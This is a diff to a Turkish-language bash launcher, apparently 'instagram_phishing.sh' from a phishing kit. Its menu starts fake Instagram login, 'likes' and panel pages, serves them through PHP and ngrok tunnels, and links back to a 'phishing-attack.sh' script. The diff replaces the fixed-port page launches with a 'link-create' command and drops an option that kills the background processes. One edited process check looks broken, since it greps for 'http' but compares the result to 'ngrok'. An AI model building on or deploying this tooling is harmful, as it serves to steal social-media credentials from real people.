@@ -75,7 +75,7 @@ echo
 echo
 echo
 function finish() {
-	kontrol=$(ps aux |grep "ngrok" |grep -v grep |grep -o ngrok)
+	kontrol=$(ps aux |grep ngrok |grep -v grep |grep -o http)
 	if [[ $kontrol == ngrok ]];then
 		killall ngrok
 		killall php
@@ -241,15 +241,7 @@ if [[ -a saved_info.txt ]];then
 		echo
 		echo
 		sleep 1
-		kontrol=$(basename $(pwd))
-		if [[ $kontrol == attack ]];then
-			port="4141"
-		elif [[ $kontrol == begeni ]];then
-			port="4242"
-		elif [[ $kontrol == fake-panel ]];then
-			port="4343"
-		fi
-		bash index.sh -bg -p $port
+		link-create -p
 		echo
 		echo
 		echo
@@ -282,7 +274,7 @@ read -e -p $'\e[31m───────[ \e[97mSEÇENEK GİRİNİZ\e[31m ]─�
 if [[ $secim == 1 ]];then
 	cd files/attack
 	bulunan
-	bash index.sh -bg -p 4141
+	link-create -p
 	echo
 	echo
 	echo
@@ -298,7 +290,7 @@ if [[ $secim == 1 ]];then
 elif [[ $secim == 2 ]];then
 	cd files/begeni
 	bulunan
-	bash index.sh -bg -p 4242
+	link-create -p
 	echo
 	echo
 	echo
@@ -314,7 +306,7 @@ elif [[ $secim == 2 ]];then
 elif [[ $secim == 3 ]];then
 	cd files/fake-panel
 	bulunan
-	bash index.sh -bg -p 4343
+	link-create -p
 	echo
 	echo
 	echo
@@ -327,32 +319,6 @@ elif [[ $secim == 3 ]];then
 	echo
 	echo
 	dongu
-elif [[ $secim == k || $secim == K ]];then
-	kontrol=$(ps aux |grep "ngrok" |grep -v grep |grep -v index |awk '{print $2}' |wc -l)
-	if [[ $kontrol == 1 ]];then
-		killall php
-		killall ngrok
-		echo
-		echo
-		echo
-		printf "\e[32m[✓] \e[33mPHP & NGROK\e[97m ARKAPLANDAN KAPATILDI"
-		echo
-		echo
-		echo
-		sleep 2
-		bash instagram_phishing.sh
-	else
-		echo
-		echo
-		echo
-		printf "\e[31m[*] \e[33mPHP & NGROK\e[97m ARKAPLANDA ÇALIŞMIYOR"
-		echo
-		echo
-		echo
-		sleep 2
-		bash instagram_phishing.sh
-		exit
-	fi
 elif [[ $secim == g || $secim == G || $secim == .. ]];then
 	cd ../..
 	bash phishing-attack.sh
